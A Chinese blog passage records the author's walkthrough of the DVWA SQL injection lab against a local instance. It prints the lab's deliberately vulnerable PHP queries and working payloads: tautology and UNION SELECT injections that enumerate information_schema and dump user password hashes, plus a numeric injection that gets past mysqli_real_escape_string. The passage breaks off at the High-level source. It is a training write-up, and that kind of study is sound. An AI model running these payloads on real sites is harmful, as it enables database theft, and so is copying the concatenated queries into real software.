<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>DVWA上手记录-SQL注入</title><meta content=DVWA上手记录-SQL注入 name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content=DVWA上手记录-SQL注入 property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/ property=twitter:url><meta content=DVWA上手记录-SQL注入 property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>DVWA上手记录-SQL注入</h1><p class=author-line>作于：2022-04-27 15:43 ，预计阅读时间 9 分钟<article><h2 id=qian-yan>前言</h2><p>SQL注入，比较熟悉的名字。看看 DVWA 里能怎么玩吧。<h2 id=yuan-li>原理</h2><p>拼字符串，和命令注入原理一样。<h2 id=jie-ti>解题</h2><h3 id=shou-ji-xin-xi>收集信息</h3><p>Low难度下SQL注入是一个简单的表单。<p><img alt=image-20220427135511588 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427135511588.webp><p>随便提交什么东西注意到地址栏变化。<p><img alt=image-20220427135532773 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427135532773.webp><p>尝试提高难度继续观察。Medium难度下表单如下。<p><img alt=image-20220427135617461 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427135617461.webp><p>High难度表单如下。<p><img alt=image-20220427135110188 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427135110188.webp><p>任务是窃取用户1~5的密码。<h3 id=low-nan-du>Low 难度</h3><p>手工注入，先尝试用经典的<code>'</code>来检测。<p><img alt=image-20220427135902575 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427135902575.webp><p>存在注入。比较菜，继续前先看看源码再决定用什么 payload。<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
</span><span style=color:#fdf4c1>
</span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>isset</span><span style=color:#fdf4c1>( $_REQUEST[ </span><span style=color:#b8bb26>'Submit' </span><span style=color:#fdf4c1>] ) ) {
</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// Get input
</span><span style=color:#fdf4c1>    $id </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_REQUEST[ </span><span style=color:#b8bb26>'id' </span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>switch </span><span style=color:#fdf4c1>($_DVWA[</span><span style=color:#b8bb26>'SQLI_DB'</span><span style=color:#fdf4c1>]) {
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#fdf4c1>MYSQL:
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// Check database
</span><span style=color:#fdf4c1>            $query  </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"</span><span style=color:#fa5c4b>SELECT</span><span style=color:#b8bb26> first_name, last_name </span><span style=color:#fa5c4b>FROM</span><span style=color:#b8bb26> users </span><span style=color:#fa5c4b>WHERE</span><span style=color:#b8bb26> user_id </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>$id</span><span style=color:#b8bb26>';"</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>            $result </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_query</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>],  $query ) </span><span style=color:#fe8019>or </span><span style=color:#fa5c4b>die</span><span style=color:#fdf4c1>( </span><span style=color:#b8bb26>'&lt;pre>' </span><span style=color:#fe8019>. </span><span style=color:#fdf4c1>((</span><span style=color:#fabd2f>is_object</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>])) ? </span><span style=color:#fabd2f>mysqli_error</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>]) : (($___mysqli_res </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_connect_error</span><span style=color:#fdf4c1>()) ? $___mysqli_res : </span><span style=color:#d3869b>false</span><span style=color:#fdf4c1>)) </span><span style=color:#fe8019>. </span><span style=color:#b8bb26>'&lt;/pre>' </span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// Get results
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>while</span><span style=color:#fdf4c1>( $row </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_fetch_assoc</span><span style=color:#fdf4c1>( $result ) ) {
</span><span style=color:#fdf4c1>                </span><span style=color:#928374;font-style:italic>// Get values
</span><span style=color:#fdf4c1>                $first </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$row[</span><span style=color:#b8bb26>"first_name"</span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>                $last  </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$row[</span><span style=color:#b8bb26>"last_name"</span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>                </span><span style=color:#928374;font-style:italic>// Feedback for end user
</span><span style=color:#fdf4c1>                </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>"&lt;pre>ID: {</span><span style=color:#fdf4c1>$id</span><span style=color:#b8bb26>}&lt;br />First name: {</span><span style=color:#fdf4c1>$first</span><span style=color:#b8bb26>}&lt;br />Surname: {</span><span style=color:#fdf4c1>$last</span><span style=color:#b8bb26>}&lt;/pre>"</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>            }
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>            </span><span style=color:#fabd2f>mysqli_close</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>]);
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>break</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#fdf4c1>SQLITE:
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// 略 ...
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>break</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>    } 
</span><span style=color:#fdf4c1>}
</span><span style=color:#fdf4c1>
</span><span>?>
</span></code></pre><p>目标SQL是<code>SELECT first_name, last_name FROM users WHERE user_id = '$id'</code>。在不知道被注入的SQL长什么样的时候其实比较倾向于连接一个布尔表达式，这样就有一个比较稳定的1比特观察窗口，可以拿来判断是否存在用户或者逐位猜解用户名、密码、字段名什么的。<p>这里先尝试连接一个 <code>' or 1=1 -- </code> 确定注入的格式（注意 <code>--</code>后面接一个空格），但暂时不会用这个方式注入。<p><img alt=image-20220427141637645 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427141637645.webp><p>先尝试下 <code>union</code> 联查一下表名,<code>' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables;--</code>，得到这样的输出。<p><img alt=image-20220427143108884 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427143108884.webp><p>太长不全部截图了。接下来注意看一下可疑的表，直接 ctrl+f 在网页里搜 <code>user</code>，很快找到这里：<p><img alt=image-20220427143202464 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427143202464.webp><p>接着找出 <code>users</code> 表的字段名，还是通过 <code>information_schema</code> ，新的 payload如下。<pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#b8bb26>' UNION SELECT c.COLUMN_NAME,c.COLUMN_TYPE  FROM information_schema.`COLUMNS` c WHERE c.TABLE_SCHEMA ='</span><span>dvwa</span><span style=color:#b8bb26>' AND c.TABLE_NAME ='</span><span>users</span><span style=color:#b8bb26>'; -- 
</span></code></pre><p><img alt=image-20220427143506909 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427143506909.webp><p>注意到字段名 <code>password</code>，接下来再 <code>union</code> 查询一下 <code>user_id</code> 和 <code>password</code> 。<p><code>union</code> 注入的时候有几个我觉得可能要注意的问题：<ol><li>被注入的 SQL 查询了几个列（<code>union</code>的查询必须有相同数量的列），或者说有几个列的可以被观测到（查出来而且前端有变化）？这里我盲猜是两个或者三个列，所以 payload 里只写了两个列。<li>查询出来之后有没有别的处理？如果还有别的判断，比如是静态类型的语言，<code>union</code>查询的列类型不匹配；或者有别的业务逻辑没通过，都可能失败。</ol><p>注入payload：<code>' UNION SELECT user_id,password FROM users; --</code><p><img alt=image-20220427143644718 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427143644718.webp><p>成功取得密码，但密码被哈希了，盲猜 md5，直接上 cmd5 解密。<p><img alt=image-20220427143819668 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427143819668.webp><p><img alt=image-20220427143838942 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427143838942.webp><p><img alt=image-20220427143852594 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427143852594.webp><p><img alt=image-20220427143905939 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427143905939.webp><p>5和1的哈希是一样的。到这里解密就全部完成了。<h3 id=medium-nan-du>Medium 难度</h3><p><img alt=image-20220427144716349 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427144716349.webp><p>注意到几点：<ol><li>前端输入变成了下拉选择。<li>变成了 post 方式请求。</ol><p>接着看下代码。<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
</span><span style=color:#fdf4c1>
</span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>isset</span><span style=color:#fdf4c1>( $_POST[ </span><span style=color:#b8bb26>'Submit' </span><span style=color:#fdf4c1>] ) ) {
</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// Get input
</span><span style=color:#fdf4c1>    $id </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_POST[ </span><span style=color:#b8bb26>'id' </span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>    $id </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_real_escape_string</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>], $id);
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>switch </span><span style=color:#fdf4c1>($_DVWA[</span><span style=color:#b8bb26>'SQLI_DB'</span><span style=color:#fdf4c1>]) {
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#fdf4c1>MYSQL:
</span><span style=color:#fdf4c1>            $query  </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"</span><span style=color:#fa5c4b>SELECT</span><span style=color:#b8bb26> first_name, last_name </span><span style=color:#fa5c4b>FROM</span><span style=color:#b8bb26> users </span><span style=color:#fa5c4b>WHERE</span><span style=color:#b8bb26> user_id </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$id</span><span style=color:#b8bb26>;"</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>            $result </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_query</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>], $query) </span><span style=color:#fe8019>or </span><span style=color:#fa5c4b>die</span><span style=color:#fdf4c1>( </span><span style=color:#b8bb26>'&lt;pre>' </span><span style=color:#fe8019>. </span><span style=color:#fabd2f>mysqli_error</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>]) </span><span style=color:#fe8019>. </span><span style=color:#b8bb26>'&lt;/pre>' </span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// Get results
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>while</span><span style=color:#fdf4c1>( $row </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_fetch_assoc</span><span style=color:#fdf4c1>( $result ) ) {
</span><span style=color:#fdf4c1>                </span><span style=color:#928374;font-style:italic>// Display values
</span><span style=color:#fdf4c1>                $first </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$row[</span><span style=color:#b8bb26>"first_name"</span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>                $last  </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$row[</span><span style=color:#b8bb26>"last_name"</span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>                </span><span style=color:#928374;font-style:italic>// Feedback for end user
</span><span style=color:#fdf4c1>                </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>"&lt;pre>ID: {</span><span style=color:#fdf4c1>$id</span><span style=color:#b8bb26>}&lt;br />First name: {</span><span style=color:#fdf4c1>$first</span><span style=color:#b8bb26>}&lt;br />Surname: {</span><span style=color:#fdf4c1>$last</span><span style=color:#b8bb26>}&lt;/pre>"</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>            }
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>break</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#fdf4c1>SQLITE:
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// 略 ...
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>break</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>    }
</span><span style=color:#fdf4c1>}
</span><span style=color:#fdf4c1>
</span><span style=color:#928374;font-style:italic>// This is used later on in the index.php page
</span><span style=color:#928374;font-style:italic>// Setting it here so we can close the database connection in here like in the rest of the source scripts
</span><span style=color:#fdf4c1>$query  </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"</span><span style=color:#fa5c4b>SELECT </span><span style=color:#fabd2f>COUNT</span><span style=color:#b8bb26>(</span><span style=color:#fdf4c1>*</span><span style=color:#b8bb26>) </span><span style=color:#fa5c4b>FROM</span><span style=color:#b8bb26> users;"</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>$result </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_query</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>],  $query ) </span><span style=color:#fe8019>or </span><span style=color:#fa5c4b>die</span><span style=color:#fdf4c1>( </span><span style=color:#b8bb26>'&lt;pre>' </span><span style=color:#fe8019>. </span><span style=color:#fdf4c1>((</span><span style=color:#fabd2f>is_object</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>])) ? </span><span style=color:#fabd2f>mysqli_error</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>]) : (($___mysqli_res </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_connect_error</span><span style=color:#fdf4c1>()) ? $___mysqli_res : </span><span style=color:#d3869b>false</span><span style=color:#fdf4c1>)) </span><span style=color:#fe8019>. </span><span style=color:#b8bb26>'&lt;/pre>' </span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>$number_of_rows </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_fetch_row</span><span style=color:#fdf4c1>( $result )[</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>
</span><span style=color:#fabd2f>mysqli_close</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>]);
</span><span>?>
</span></code></pre><p>注意到两个改变：<ol><li><code>mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);</code>，对<code>$id</code>做了转义。<li><code>"SELECT first_name, last_name FROM users WHERE user_id = $id;"</code>，变成了数字型注入。</ol><p>按理说做了转义应该就没辙了，但还是先试试。F12从开发者工具里复制出请求，然后把<code>id</code>改成<code>0 or 1=1; --</code>，注意百分号编码而且<code>--</code>后面留一个空格。<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>await </span><span style=color:#8ec07c>fetch</span><span>(</span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/sqli/"</span><span>, {
</span><span>  </span><span style=color:#b8bb26>"headers"</span><span>: {
</span><span>    </span><span style=color:#b8bb26>"accept"</span><span>: </span><span style=color:#b8bb26>"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"accept-language"</span><span>: </span><span style=color:#b8bb26>"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"cache-control"</span><span>: </span><span style=color:#b8bb26>"no-cache"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"content-type"</span><span>: </span><span style=color:#b8bb26>"application/x-www-form-urlencoded"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"pragma"</span><span>: </span><span style=color:#b8bb26>"no-cache"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-ch-ua"</span><span>: </span><span style=color:#b8bb26>"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Microsoft Edge\";v=\"100\""</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-ch-ua-mobile"</span><span>: </span><span style=color:#b8bb26>"?0"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-ch-ua-platform"</span><span>: </span><span style=color:#b8bb26>"\"Windows\""</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-dest"</span><span>: </span><span style=color:#b8bb26>"document"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-mode"</span><span>: </span><span style=color:#b8bb26>"navigate"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-site"</span><span>: </span><span style=color:#b8bb26>"same-origin"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-user"</span><span>: </span><span style=color:#b8bb26>"?1"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"upgrade-insecure-requests"</span><span>: </span><span style=color:#b8bb26>"1"
</span><span>  },
</span><span>  </span><span style=color:#b8bb26>"referrer"</span><span>: </span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/sqli/"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"referrerPolicy"</span><span>: </span><span style=color:#b8bb26>"strict-origin-when-cross-origin"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"body"</span><span>: </span><span style=color:#b8bb26>"id=0%20or%201%3D1%3B%20--%20&Submit=Submit"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"method"</span><span>: </span><span style=color:#b8bb26>"POST"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"mode"</span><span>: </span><span style=color:#b8bb26>"cors"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"credentials"</span><span>: </span><span style=color:#b8bb26>"include"
</span><span>});
</span></code></pre><p><img alt=image-20220427145427860 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427145427860.webp><p>好吧，这就直接成功了。到了这一步其实剩下的和 Low 难度就没区别了。<p>不过我对那个 <code>mysqli_real_escape_string</code> 还是很好奇，这个函数不是拿来防 SQL 注入的？查询文档如下。<blockquote><p>mysqli::real_escape_string -- mysqli_real_escape_string — Escapes special characters in a string for use in an SQL statement, taking into account the current charset of the connection</blockquote><p>看用例，这个<code>real_escape_string</code>会把参数转义成合法的 SQL 字符串，也就是应该会转义处理特殊字符比如<code>'</code>，但返回结果是没有<code>'</code>的，所以即使用<code>real_escape_string</code>转义后，这个参数最多是可以被安全放到<code>''</code>里，但如果不是在<code>''</code>里的话安全隐患就一点不少。<h3 id=high-nan-du>High 难度</h3><p><img alt=image-20220427150448746 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427150448746.webp><p>High难度就比较怪了，从这个窗口输入1提交之后，页面直接刷新出了id对应的用户信息，这个交互是真没见过。接着审阅下源码。<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
</span><span style=color:#fdf4c1>
</span><span style=color:#fa5c4b>if</span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>isset</span><span style=color:#fdf4c1>( $_SESSION [ </span><span style=color:#b8bb26>'id' </span><span style=color:#fdf4c1>] ) ) {
</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic>// Get input
</span><span style=color:#fdf4c1>    $id </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_SESSION[ </span><span style=color:#b8bb26>'id' </span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>switch </span><span style=color:#fdf4c1>($_DVWA[</span><span style=color:#b8bb26>'SQLI_DB'</span><span style=color:#fdf4c1>]) {
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#fdf4c1>MYSQL:
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// Check database
</span><span style=color:#fdf4c1>            $query  </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"</span><span style=color:#fa5c4b>SELECT</span><span style=color:#b8bb26> first_name, last_name </span><span style=color:#fa5c4b>FROM</span><span style=color:#b8bb26> users </span><span style=color:#fa5c4b>WHERE</span><span style=color:#b8bb26> user_id </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>$id</span><span style=color:#b8bb26>' </span><span style=color:#fa5c4b>LIMIT </span><span style=color:#d3869b>1</span><span style=color:#b8bb26>;"</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>            $result </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_query</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>], $query ) </span><span style=color:#fe8019>or </span><span style=color:#fa5c4b>die</span><span style=color:#fdf4c1>( </span><span style=color:#b8bb26>'&lt;pre>Something went wrong.&lt;/pre>' </span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// Get results
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>while</span><span style=color:#fdf4c1>( $row </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_fetch_assoc</span><span style=color:#fdf4c1>( $result ) ) {
</span><span style=color:#fdf4c1>                </span><span style=color:#928374;font-style:italic>// Get values
</span><span style=color:#fdf4c1>                $first </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$row[</span><span style=color:#b8bb26>"first_name"</span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>                $last  </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$row[</span><span style=color:#b8bb26>"last_name"</span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>                </span><span style=color:#928374;font-style:italic>// Feedback for end user
</span><span style=color:#fdf4c1>                </span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>"&lt;pre>ID: {</span><span style=color:#fdf4c1>$id</span><span style=color:#b8bb26>}&lt;br />First name: {</span><span style=color:#fdf4c1>$first</span><span style=color:#b8bb26>}&lt;br />Surname: {</span><span style=color:#fdf4c1>$last</span><span style=color:#b8bb26>}&lt;/pre>"</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>            }
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>            ((</span><span style=color:#fabd2f>is_null</span><span style=color:#fdf4c1>($___mysqli_res </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>mysqli_close</span><span style=color:#fdf4c1>($GLOBALS[</span><span style=color:#b8bb26>"___mysqli_ston"</span><span style=color:#fdf4c1>]))) ? </span><span style=color:#d3869b>false</span><span style=color:#fdf4c1> : $___mysqli_res);        
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>break</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#fdf4c1>SQLITE:
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic>// 略 ...
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>break</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>    }
</span><span style=color:#fdf4c1>}
</span><span style=color:#fdf4c1>
</span><span>?>
